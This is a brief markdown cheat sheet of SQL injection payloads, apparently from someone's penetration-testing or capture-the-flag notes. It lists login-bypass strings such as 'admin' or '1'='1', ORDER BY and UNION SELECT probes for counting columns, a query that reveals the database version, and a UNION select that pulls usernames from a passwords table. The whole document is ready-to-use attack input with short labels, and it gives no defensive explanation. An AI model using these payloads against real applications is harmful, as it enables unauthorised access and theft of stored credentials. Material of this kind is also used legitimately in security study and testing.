# Injections

## SQLi

`admin' or '1'='1`&#x20;

`admin'--`&#x20;

`admin')-- -`

`' order by 1-- -` Detect number of columns using order by&#x20;

`cn' UNION select 1,2,3-- -` Detect number of columns using Union injection&#x20;

`cn' UNION select 1,@@version,3,4-- -` Basic Union injection UNION select username, 2, 3, 4 from passwords-- - Union injection for 4 columns
